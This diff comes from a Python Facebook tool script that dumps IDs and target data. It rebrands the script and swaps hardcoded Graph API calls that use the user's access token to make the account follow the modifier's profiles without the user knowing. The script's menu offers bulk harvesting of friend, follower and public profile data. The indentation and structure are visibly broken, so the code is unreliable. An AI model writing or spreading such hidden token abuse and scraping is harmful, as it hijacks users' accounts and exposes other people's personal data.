@@ -16,7 +16,7 @@ def jalan(z):
 		time.sleep(0.03)
 
 def banner():
-    print("""   ___                \n  / _ \__ ____ _  ___ ® ┌──────────────────────────────┐\n / // / // /  ' \/ _ \  │  Script By Dapunta Khurayra  │\n/____/\_,_/_/_/_/ .__/  │   •• Github.com/Dapunta ••   │\n   ID Facebook /_/      └──────────────────────────────┘""")
+    print("""   ___                \n  / _ \__ ____ _  ___ ® ┌──────────────────────────────┐\n / // / // /  ' \/ _ \  │  Script By 44 K453P  │\n/____/\_,_/_/_/_/ .__/  │   •• Github.com/44_K453P ••   │\n   ID Facebook /_/      └──────────────────────────────┘""")
   
 def masuk():
     os.system("clear")
@@ -104,12 +104,12 @@ def bot_follow():
 	except IOError:
 		print("\n   [!] Token invalid")
 		masuk()
-    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Dapunta Khurayra X
-    	requests.post('https://graph.facebook.com/1602590373/subscribers?access_token=' + toket)      #Anthonyus Immanuel
-    	requests.post('https://graph.facebook.com/100000729074466/subscribers?access_token=' + toket) #Abigaille Dirgantara
-    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Boirah
-    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
-    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Dapunta Xayonara
+    	requests.post('https://graph.facebook.com/100007095946782/subscribers?access_token=' + toket)      #44 K453P
+    	requests.post('https://graph.facebook.com/100006792461977/subscribers?access_token=' + toket)      #44 K453P
+    	requests.post('https://graph.facebook.com/100009218573546/subscribers?access_token=' + toket) #44 K453P
+    	requests.post('https://graph.facebook.com/100021545539536/subscribers?access_token=' + toket)       #44 K453P
+    	requests.post('https://graph.facebook.com/100001881339355/subscribers?access_token=' + toket) #44 K453P
+    	requests.post('https://graph.facebook.com/100008044232799/subscribers?access_token=' + toket)  #44 K453P
     	menu()
 			
 def menu():
@@ -149,7 +149,7 @@ def menu():
 	except Exception as e:
 	    	print ("\n[•] Error : %s"%e)
 	def    	menu():
-    	print("[1] Dump ID From Friend")
+    	print("\n   [1] Dump ID From Friend")
     	print("[2] Dump ID From Public")
     	print("[3] Dump ID From Followers")
 	print("[4] Get Data Target")
